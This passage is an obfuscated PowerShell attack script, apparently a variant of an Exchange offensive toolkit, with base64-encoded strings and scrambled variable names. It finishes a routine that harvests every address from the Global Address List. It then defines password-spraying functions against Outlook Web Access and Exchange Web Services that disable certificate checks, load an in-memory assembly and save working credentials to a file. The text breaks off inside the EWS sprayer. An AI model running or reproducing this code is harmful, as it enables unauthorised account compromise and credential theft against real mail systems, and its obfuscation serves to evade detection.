        Write-Host -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAGUAZQBuAA=='))) ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABBACAAdABvAHQAYQBsACAAbwBmACAA'))) + ${_/\_/\__/\__/\/\/}.count + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABlAG0AYQBpAGwAIABhAGQAZAByAGUAcwBzAGUAcwAgAHcAZQByAGUAIAByAGUAdAByAGkAZQB2AGUAZAA='))))
        If ($OutFile -ne "")
        {
            ${_/\_/\__/\__/\/\/} | Out-File -Encoding ascii $OutFile
            echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABFAG0AYQBpAGwAIABhAGQAZAByAGUAcwBzAGUAcwAgAGgAYQB2AGUAIABiAGUAZQBuACAAdwByAGkAdAB0AGUAbgAgAHQAbwAgACQATwB1AHQARgBpAGwAZQA=')))
        }
    }
    catch
    {
        Write-Host -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eQBlAGwAbABvAHcA'))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('DQAKAFsAKgBdACAARgBpAG4AZABQAGUAbwBwAGwAZQAgAG0AZQB0AGgAbwBkACAAZgBhAGkAbABlAGQALgAgAFQAcgB5AGkAbgBnACAARQB4AGMAaABhAG4AZwBlACAAVwBlAGIAIABTAGUAcgB2AGkAYwBlAHMALgAuAC4A')))
        __/=\_/==\___/\___
        echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABUAHIAeQBpAG4AZwAgAEUAeABjAGgAYQBuAGcAZQAgAHYAZQByAHMAaQBvAG4AIAAkAEUAeABjAGgAYQBuAGcAZQBWAGUAcgBzAGkAbwBuAA==')))
        ${____/====\/\/=\__} = [Microsoft.Exchange.WebServices.Data.ExchangeVersion]::$ExchangeVersion
        ${/==\/\_______/\/=} = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService(${____/====\/\/=\__})
        ${_/\___/=\__/==\/=} = $Password | ConvertTo-SecureString -AsPlainText -Force
        ${_/==\__/====\__/=} = New-Object System.Management.Automation.PSCredential -ArgumentList $UserName,${_/\___/=\__/==\/=}
        ${/==\/\_______/\/=}.UseDefaultCredentials = $false
        ${/==\/\_______/\/=}.Credentials = ${_/==\__/====\__/=}.GetNetworkCredential()
        if ($ExchHostname -ne "")
        {
            ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABVAHMAaQBuAGcAIABFAFcAUwAgAFUAUgBMACAA'))) + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAA=='))) + $ExchHostname + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBFAFcAUwAvAEUAeABjAGgAYQBuAGcAZQAuAGEAcwBtAHgA'))))
            ${/==\/\_______/\/=}.Url = new-object System.Uri(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAA=='))) + $ExchHostname + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBFAFcAUwAvAEUAeABjAGgAYQBuAGcAZQAuAGEAcwBtAHgA')))))
        }
        else
        {
            ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABBAHUAdABvAGQAaQBzAGMAbwB2AGUAcgBpAG4AZwAgAGUAbQBhAGkAbAAgAHMAZQByAHYAZQByACAAZgBvAHIAIAA='))) + $Mailbox + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgAuAC4A'))))
            ${/==\/\_______/\/=}.AutoDiscoverUrl($Mailbox, {$true})
        }    
        ${/\_____/===\/\___} = [Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox
        ${_/\___/=\___/===\} = New-Object Microsoft.Exchange.WebServices.Data.Mailbox( $Mailbox )
        ${/=\_______/=\___/} = New-Object Microsoft.Exchange.WebServices.Data.FolderId( ${/\_____/===\/\___}, ${_/\___/=\___/===\})   
        try
        {
            ${_/\/====\/\/=\___} = [Microsoft.Exchange.WebServices.Data.Folder]::Bind(${/==\/\_______/\/=},${/=\_______/=\___/})
        }
        catch
        {
            ${/=\__/\_/\/==\/=\} = $_.Exception.Message
            if (${/=\__/\_/\/==\/=\} -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBFAHgAYwBoAGEAbgBnAGUAIABTAGUAcgB2AGUAcgAgAGQAbwBlAHMAbgAnAHQAIABzAHUAcABwAG8AcgB0ACAAdABoAGUAIAByAGUAcQB1AGUAcwB0AGUAZAAgAHYAZQByAHMAaQBvAG4ALgAqAA=='))))
            {
                echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABFAFIAUgBPAFIAOgAgAFQAaABlACAAYwBvAG4AbgBlAGMAdABpAG8AbgAgAHQAbwAgAEUAeABjAGgAYQBuAGcAZQAgAGYAYQBpAGwAZQBkACAAdQBzAGkAbgBnACAARQB4AGMAaABhAG4AZwBlACAAVgBlAHIAcwBpAG8AbgAgACQARQB4AGMAaABhAG4AZwBlAFYAZQByAHMAaQBvAG4ALgA=')))
                echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABUAHIAeQAgAHMAZQB0AHQAaQBuAGcAIAB0AGgAZQAgAC0ARQB4AGMAaABhAG4AZwBlAFYAZQByAHMAaQBvAG4AIABmAGwAYQBnACAAdABvACAAdABoAGUAIABFAHgAYwBoAGEAbgBnAGUAIAB2AGUAcgBzAGkAbwBuACAAbwBmACAAdABoAGUAIABzAGUAcgB2AGUAcgAuAA==')))
                echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABTAG8AbQBlACAAbwBwAHQAaQBvAG4AcwAgAHQAbwAgAHQAcgB5ADoAIABFAHgAYwBoAGEAbgBnAGUAMgAwADAANwBfAFMAUAAxACwAIABFAHgAYwBoAGEAbgBnAGUAMgAwADEAMAAsACAARQB4AGMAaABhAG4AZwBlADIAMAAxADAAXwBTAFAAMQAsACAARQB4AGMAaABhAG4AZwBlADIAMAAxADAAXwBTAFAAMgAsACAARQB4AGMAaABhAG4AZwBlADIAMAAxADMALAAgAG8AcgAgAEUAeABjAGgAYQBuAGcAZQAyADAAMQAzAF8AUwBQADEALgA=')))
                break
            }
        }
        ${/=\/\/=\_/=\_/\__} = @()
        65..90 | foreach-object{${/=\/\/=\_/=\_/\__}+=[char]$_}
        ${/=\__/\__/==\__/\} = @()
        Foreach (${____/\/==\_/=====} in ${/=\/\/=\_/=\_/\__})
        {
            ${/=\/\/=\_/=\_/\__} | foreach-object{${/=\__/\__/==\__/\} += (${____/\/==\_/=====} + $_)}
        }
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABOAG8AdwAgAGEAdAB0AGUAbQBwAHQAaQBuAGcAIAB0AG8AIABnAGEAdABoAGUAcgAgAHQAaABlACAARwBsAG8AYgBhAGwAIABBAGQAZAByAGUAcwBzACAATABpAHMAdAAuACAAVABoAGkAcwAgAG0AaQBnAGgAdAAgAHQAYQBrAGUAIABhACAAdwBoAGkAbABlAC4ALgAuAA0ACgA=')))
        ${_/\_/\__/\__/\/\/} = @()
        foreach(${___/\__/=\_/=\___} in ${/=\__/\__/==\__/\})
        {
            ${_/\/=\_______/=\/} = ${/==\/\_______/\/=}.ResolveName(${___/\__/=\_/=\___})
            foreach(${_/=\___/=\/=\_/\/} in ${_/\/=\_______/=\/})
            {
                echo ${_/=\___/=\/=\_/\/}.Mailbox.Address
                ${_/\_/\__/\__/\/\/} += ${_/=\___/=\/=\_/\/}.Mailbox
            }
        }
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABOAG8AdwAgAGMAbABlAGEAbgBpAG4AZwAgAHUAcAAgAHQAaABlACAAbABpAHMAdAAuAC4ALgA=')))
        ${_/\_/\__/\__/\/\/} = ${_/\_/\__/\__/\/\/} | sort | gu
        echo ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQAgAHQAbwB0AGEAbAAgAG8AZgAgAA=='))) + ${_/\_/\__/\__/\/\/}.count + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABlAG0AYQBpAGwAIABhAGQAZAByAGUAcwBzAGUAcwAgAHcAZQByAGUAIAByAGUAdAByAGkAZQB2AGUAZAA='))))
        If ($OutFile -ne "")
        {
            ${_/\_/\__/\__/\/\/} | select Address | Out-File -Encoding ascii $OutFile
        }
    }
}
function Invoke-PasswordSprayOWA{
  Param(
    [Parameter(Position = 0, Mandatory = $false)]
    [system.URI]
    $ExchHostname = "",
    [Parameter(Position = 1, Mandatory = $False)]
    [string]
    $OutFile = "",
    [Parameter(Position = 2, Mandatory = $False)]
    [string]
    $UserList = "",
    [Parameter(Position = 3, Mandatory = $False)]
    [string]
    $Password = "",
    [Parameter(Position = 4, Mandatory = $False)]
    [string]
    $Threads = "5",
    [Parameter(Position = 6, Mandatory = $False)]
    [string]
    $Domain = ""
  )
    Write-Host -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eQBlAGwAbABvAHcA'))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABOAG8AdwAgAHMAcAByAGEAeQBpAG4AZwAgAHQAaABlACAATwBXAEEAIABwAG8AcgB0AGEAbAAgAGEAdAAgAGgAdAB0AHAAcwA6AC8ALwAkAEUAeABjAGgASABvAHMAdABuAGEAbQBlAC8AbwB3AGEALwA=')))
    ${/==\___/=\/\__/\_} = Get-Date
    Write-Host -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eQBlAGwAbABvAHcA'))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABDAHUAcgByAGUAbgB0ACAAZABhAHQAZQAgAGEAbgBkACAAdABpAG0AZQA6ACAAJAB7ADEANwAyAH0A')))
    ${_/=\/=====\__/\_/=} = ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAA=='))) + $ExchHostname + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBvAHcAYQAvAGEAdQB0AGgALgBvAHcAYQA='))))
    ${_/===\__/==\_/\/==} = ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAA=='))) + $ExchHostname + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBvAHcAYQAvAA=='))))
    ${__/\_/=\_/=\_/\_/} = gc $UserList
    ${/=\/====\_/\/=\/\} = ${__/\_/=\_/=\_/\_/}.count
    ${/=\/\_/\___/\/\__} = @()
    ${/=\_/\__/\/===\/\} = @{}
    ${/=\/====\_/\/=\/\} = 0 
    ${__/\_/=\_/=\_/\_/} |% {${/=\_/\__/\/===\/\}[${/=\/====\_/\/=\/\} % $Threads] += @($_);${/=\/====\_/\/=\/\}++}
    0..($Threads-1) |% {
    sajb -ScriptBlock{
    ${/==\__/=\/\/=\_/=}=New-Object Microsoft.CSharp.CSharpCodeProvider
    ${/\_____/=\__/\__/}=${/==\__/=\/\/=\_/=}.CreateCompiler()
    ${__/\/\_/\_/\_/\__}=New-Object System.CodeDom.Compiler.CompilerParameters
    ${__/\/\_/\_/\_/\__}.GenerateExecutable=$False
    ${__/\/\_/\_/\_/\__}.GenerateInMemory=$True
    ${__/\/\_/\_/\_/\__}.IncludeDebugInformation=$False
    ${__/\/\_/\_/\_/\__}.ReferencedAssemblies.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBEAEwATAA=')))) > $null
    ${__/=\/\_/===\__/=}=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgACAAIABuAGEAbQBlAHMAcABhAGMAZQAgAEwAbwBjAGEAbAAuAFQAbwBvAGwAawBpAHQARQB4AHQAZQBuAHMAaQBvAG4AcwAuAE4AZQB0AC4AQwBlAHIAdABpAGYAaQBjAGEAdABlAFAAbwBsAGkAYwB5AHsADQAKACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAYwBsAGEAcwBzACAAVAByAHUAcwB0AEEAbABsACAAOgAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBJAEMAZQByAHQAaQBmAGkAYwBhAHQAZQBQAG8AbABpAGMAeQAgAHsADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAFQAcgB1AHMAdABBAGwAbAAoACkAIAB7ACAADQAKACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABiAG8AbwBsACAAQwBoAGUAYwBrAFYAYQBsAGkAZABhAHQAaQBvAG4AUgBlAHMAdQBsAHQAKABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQAIABzAHAALAANAAoAIAAgACAAIAAgACAAIAAgACAAIABTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAEMAcgB5AHAAdABvAGcAcgBhAHAAaAB5AC4AWAA1ADAAOQBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAcwAuAFgANQAwADkAQwBlAHIAdABpAGYAaQBjAGEAdABlACAAYwBlAHIAdAAsACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAByAGUAcQAsACAAaQBuAHQAIABwAHIAbwBiAGwAZQBtACkAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgAHIAZQB0AHUAcgBuACAAdAByAHUAZQA7AA0ACgAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAB9AA=='))) 
    ${_/=\_/\_/=\___/\_}=${/==\__/=\/\/=\_/=}.CompileAssemblyFromSource(${__/\/\_/\_/\_/\__},${__/=\/\_/===\__/=})
    ${_/\_/======\__/==}=${_/=\_/\_/=\___/\_}.CompiledAssembly
    ${__/\_/==\________}=${_/\_/======\__/==}.CreateInstance($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAC4AVABvAG8AbABrAGkAdABFAHgAdABlAG4AcwBpAG8AbgBzAC4ATgBlAHQALgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAUABvAGwAaQBjAHkALgBUAHIAdQBzAHQAQQBsAGwA'))))
    [System.Net.ServicePointManager]::CertificatePolicy=${__/\_/==\________}
    $Password = $args[1]
    ${_/===\__/==\_/\/==} = $args[2]
    ${_/=\/=====\__/\_/=} = $args[3]
    $Domain = $args[4]
    ForEach($Username in $args[0])
    {
        $ProgressPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBpAGwAZQBuAHQAbAB5AGMAbwBuAHQAaQBuAHUAZQA=')))
	if ($Domain -ne "")
    {
        $Username = ($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABEAG8AbQBhAGkAbgA='))) + "\" + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABVAHMAZQByAG4AYQBtAGUA'))))
    }
    ${_/\/==\_/\/==\/\/} = ""
    ${/===\/=\___/\_/\/} = ""
	${/==\_/\_/\__/==\_} = iwr -Uri ${_/===\__/==\_/\/==} -SessionVariable sess -ErrorAction SilentlyContinue 
	${_/\/==\/\__/\/==\} = ${/==\_/\_/\__/==\_}.Forms[0]
	${_/\/==\/\__/\/==\}.fields.password=$Password
	${_/\/==\/\__/\/==\}.fields.username=$Username
        ${_/\/=\_/=\__/\/\/} = iwr -Uri ${_/=\/=====\__/\_/=} -Method POST -Body  ${_/\/==\/\__/\/==\}.Fields -MaximumRedirection 2 -SessionVariable sess -ErrorAction SilentlyContinue 
        ${____/\__/\/==\/\/} = ${/===\/=\___/\_/\/}.Cookies.GetCookies(${_/===\__/==\_/\/==})
        foreach (${/\____/===\/=\___} in ${____/\__/\/==\/\/})
        {
            if (${/\____/===\/=\___}.Name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBhAGQAYQB0AGEA'))))
                {
                ${_/\/==\_/\/==\/\/} = ${/\____/===\/=\___}.Value
                }
        }
	if (${_/\/==\_/\/==\/\/})
	{
		echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABTAFUAQwBDAEUAUwBTACEAIABVAHMAZQByADoAJAB1AHMAZQByAG4AYQBtAGUAIABQAGEAcwBzAHcAbwByAGQAOgAkAHAAYQBzAHMAdwBvAHIAZAA=')))
	}
	${_____/=\__/\__/=\}+=1 
    }
    } -ArgumentList ${/=\_/\__/\/===\/\}[$_], $Password, ${_/===\__/==\_/\/==}, ${_/=\/=====\__/\_/=}, $Domain | Out-Null
}
${__/==\/\__/=\/===} = Get-Date
${_/=\_/\_/========} = 10000
${_/=\_/==\__/=\/==} = 200
        ${_/\/\/\/===\_/=\_} = @()
While ($(gjb -State Running).count -gt 0){
    ${/===\__/=\/\_/\/\} = ""
    ForEach (${_/\/\/=\__/=\____}  in $(gjb -state running)){${/===\__/=\/\_/\/\} += ", $(${_/\/\/=\__/=\____}.name)"}
    ${/===\__/=\/\_/\/\} = ${/===\__/=\/\_/\/\}.Substring(2)
    Write-Progress  -Activity $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AG8AcgBkACAAUwBwAHIAYQB5AGkAbgBnACAAdABoAGUAIABPAFcAQQAgAHAAbwByAHQAYQBsACAAYQB0ACAAaAB0AHQAcABzADoALwAvACQARQB4AGMAaABIAG8AcwB0AG4AYQBtAGUALwBvAHcAYQAvAC4AIABTAGkAdAAgAHQAaQBnAGgAdAAuAC4ALgA='))) -Status "$($(gjb -State Running).count) threads remaining" -PercentComplete ($(gjb -State Completed).count / $(gjb).count * 100)
    If ($(New-TimeSpan ${__/==\/\__/=\/===} $(Get-Date)).totalseconds -ge ${_/=\_/\_/========}){$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBpAGwAbABpAG4AZwAgAGEAbABsACAAagBvAGIAcwAgAHMAdABpAGwAbAAgAHIAdQBuAG4AaQBuAGcAIAAuACAALgAgAC4A')));gjb -State Running | rjb -Force}
    sleep -Milliseconds ${_/=\_/==\__/=\/==}
    ForEach(${_/\/\/=\__/=\____} in gjb){
        ${_/=\__/\_/\/=\/\_} = rcjb ${_/\/\/=\__/=\____}
        echo ${_/=\__/\_/\/=\/\_}
        ${_/\/\/\/===\_/=\_} += ${_/=\__/\_/\/=\/\_}
    }
}
    echo ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABBACAAdABvAHQAYQBsACAAbwBmACAA'))) + ${_/\/\/\/===\_/=\_}.count + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAIAB3AGUAcgBlACAAbwBiAHQAYQBpAG4AZQBkAC4A'))))
    if ($OutFile -ne "")
       {
            ${_/\/\/\/===\_/=\_} = ${_/\/\/\/===\_/=\_} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABbAFwAKgBcAF0AIABTAFUAQwBDAEUAUwBTACEAIABVAHMAZQByADoA'))),''
            ${_/\/\/\/===\_/=\_} = ${_/\/\/\/===\_/=\_} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABQAGEAcwBzAHcAbwByAGQAOgA='))), ":"
            ${_/\/\/\/===\_/=\_} | Out-File -Encoding ascii $OutFile
            echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAcwAgAGgAYQB2AGUAIABiAGUAZQBuACAAdwByAGkAdAB0AGUAbgAgAHQAbwAgACQATwB1AHQARgBpAGwAZQAuAA==')))
       }
}
function Invoke-PasswordSprayEWS{
  Param(
    [Parameter(Position = 0, Mandatory = $false)]
    [system.URI]
    $ExchHostname = "",
    [Parameter(Position = 1, Mandatory = $False)]
    [string]
    $OutFile = "",
    [Parameter(Position = 2, Mandatory = $False)]
    [string]
    $UserList = "",
    [Parameter(Position = 3, Mandatory = $False)]
    [string]
    $Password = "",
    [Parameter(Position = 4, Mandatory = $False)]
    [string]
    $ExchangeVersion = "Exchange2010",
    [Parameter(Position = 5, Mandatory = $False)]
    [string]
    $Threads = "5",
    [Parameter(Position = 6, Mandatory = $False)]
    [string]
    $Domain = ""
  )
    Write-Host -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eQBlAGwAbABvAHcA'))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABOAG8AdwAgAHMAcAByAGEAeQBpAG4AZwAgAHQAaABlACAARQBXAFMAIABwAG8AcgB0AGEAbAAgAGEAdAAgAGgAdAB0AHAAcwA6AC8ALwAkAEUAeABjAGgASABvAHMAdABuAGEAbQBlAC8ARQBXAFMALwBFAHgAYwBoAGEAbgBnAGUALgBhAHMAbQB4AA==')))
    ${/==\___/=\/\__/\_} = Get-Date
    Write-Host -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eQBlAGwAbABvAHcA'))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABDAHUAcgByAGUAbgB0ACAAZABhAHQAZQAgAGEAbgBkACAAdABpAG0AZQA6ACAAJAB7ADEANwAyAH0A')))
    ${__/\_/=\_/=\_/\_/} = gc $UserList
    ${/=\/====\_/\/=\/\} = ${__/\_/=\_/=\_/\_/}.count
    ${/=\/\_/\___/\/\__} = @()
    ${/=\_/\__/\/===\/\} = @{}
    ${/=\/====\_/\/=\/\} = 0 
    ${__/\_/=\_/=\_/\_/} |% {${/=\_/\__/\/===\/\}[${/=\/====\_/\/=\/\} % $Threads] += @($_);${/=\/====\_/\/=\/\}++}
    ${_/\___/=\__/==\/=} = $Password | ConvertTo-SecureString -AsPlainText -Force
    echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABUAHIAeQBpAG4AZwAgAEUAeABjAGgAYQBuAGcAZQAgAHYAZQByAHMAaQBvAG4AIAAkAEUAeABjAGgAYQBuAGcAZQBWAGUAcgBzAGkAbwBuAA==')))
    ${/=\__/\/\__/\/\/=} = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(${/==\/====\/=\_/\_}),[IO.Compression.CompressionMode]::Decompress)
    ${/=\__/===\/\____/} = New-Object Byte[](1092608)
    ${/=\__/\/\__/\/\/=}.Read(${/=\__/===\/\____/}, 0, 1092608) | Out-Null
    0..($Threads-1) |% {
        sajb -ScriptBlock{
  ${/=\__/===\/\____/} = $args[6]
  ${_/\/\/\/\__/\/=\_} = [Reflection.Assembly]::Load(${/=\__/===\/\____/})
    ${/==\__/=\/\/=\_/=}=New-Object Microsoft.CSharp.CSharpCodeProvider
    ${/\_____/=\__/\__/}=${/==\__/=\/\/=\_/=}.CreateCompiler()
    ${__/\/\_/\_/\_/\__}=New-Object System.CodeDom.Compiler.CompilerParameters
    ${__/\/\_/\_/\_/\__}.GenerateExecutable=$False
    ${__/\/\_/\_/\_/\__}.GenerateInMemory=$True
    ${__/\/\_/\_/\_/\__}.IncludeDebugInformation=$False
    ${__/\/\_/\_/\_/\__}.ReferencedAssemblies.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBEAEwATAA=')))) > $null
    ${__/=\/\_/===\__/=}=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgACAAIABuAGEAbQBlAHMAcABhAGMAZQAgAEwAbwBjAGEAbAAuAFQAbwBvAGwAawBpAHQARQB4AHQAZQBuAHMAaQBvAG4AcwAuAE4AZQB0AC4AQwBlAHIAdABpAGYAaQBjAGEAdABlAFAAbwBsAGkAYwB5AHsADQAKACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAYwBsAGEAcwBzACAAVAByAHUAcwB0AEEAbABsACAAOgAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBJAEMAZQByAHQAaQBmAGkAYwBhAHQAZQBQAG8AbABpAGMAeQAgAHsADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAFQAcgB1AHMAdABBAGwAbAAoACkAIAB7ACAADQAKACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABiAG8AbwBsACAAQwBoAGUAYwBrAFYAYQBsAGkAZABhAHQAaQBvAG4AUgBlAHMAdQBsAHQAKABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQAIABzAHAALAANAAoAIAAgACAAIAAgACAAIAAgACAAIABTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAEMAcgB5AHAAdABvAGcAcgBhAHAAaAB5AC4AWAA1ADAAOQBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAcwAuAFgANQAwADkAQwBlAHIAdABpAGYAaQBjAGEAdABlACAAYwBlAHIAdAAsACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAByAGUAcQAsACAAaQBuAHQAIABwAHIAbwBiAGwAZQBtACkAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgAHIAZQB0AHUAcgBuACAAdAByAHUAZQA7AA0ACgAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAB9AA=='))) 
    ${_/=\_/\_/=\___/\_}=${/==\__/=\/\/=\_/=}.CompileAssemblyFromSource(${__/\/\_/\_/\_/\__},${__/=\/\_/===\__/=})
    ${_/\_/======\__/==}=${_/=\_/\_/=\___/\_}.CompiledAssembly
    ${__/\_/==\________}=${_/\_/======\__/==}.CreateInstance($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAC4AVABvAG8AbABrAGkAdABFAHgAdABlAG4AcwBpAG8AbgBzAC4ATgBlAHQALgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAUABvAGwAaQBjAHkALgBUAHIAdQBzAHQAQQBsAGwA'))))
    [System.Net.ServicePointManager]::CertificatePolicy=${__/\_/==\________}
            $ExchangeVersion = $args[4]
            ${____/====\/\/=\__} = [Microsoft.Exchange.WebServices.Data.ExchangeVersion]::$ExchangeVersion
            ${/==\/\_______/\/=} = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService(${____/====\/\/=\__})
            ForEach($UserName in $args[0])
            {
                ${_/\___/=\__/==\/=} = $args[1]
                $ExchHostname = $args[2]
                $Mailbox = $args[3]
                $Password = $args[5]
                $Domain = $args[7]
                if ($Domain -ne "")
                {
                $UserName = ($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABEAG8AbQBhAGkAbgA='))) + "\" + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABVAHMAZQByAE4AYQBtAGUA'))))
                }
                ${_/==\__/====\__/=} = New-Object System.Management.Automation.PSCredential -ArgumentList $UserName,${_/\___/=\__/==\/=}
                ${/==\/\_______/\/=}.UseDefaultCredentials = $false
                ${/==\/\_______/\/=}.Credentials = ${_/==\__/====\__/=}.GetNetworkCredential()
                ${/==\/\_______/\/=}.Url = new-object System.Uri(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAA=='))) + $ExchHostname + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBFAFcAUwAvAEUAeABjAGgAYQBuAGcAZQAuAGEAcwBtAHgA')))))
                ${/\_____/===\/\___} = [Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox
                ${_/\___/=\___/===\} = New-Object Microsoft.Exchange.WebServices.Data.Mailbox( $Mailbox )
                ${/=\_______/=\___/} = New-Object Microsoft.Exchange.WebServices.Data.FolderId( ${/\_____/===\/\___}, ${_/\___/=\___/===\})   
                try
                {
                    ${_/\/====\/\/=\___} = [Microsoft.Exchange.WebServices.Data.Folder]::Bind(${/==\/\_______/\/=},${/=\_______/=\___/}) 
                    echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABTAFUAQwBDAEUAUwBTACEAIABVAHMAZQByADoAJAB1AHMAZQByAG4AYQBtAGUAIABQAGEAcwBzAHcAbwByAGQAOgAkAFAAYQBzAHMAdwBvAHIAZAA=')))
                }
                catch
                {
                    ${/=\__/\_/\/==\/=\} = $_.Exception.Message
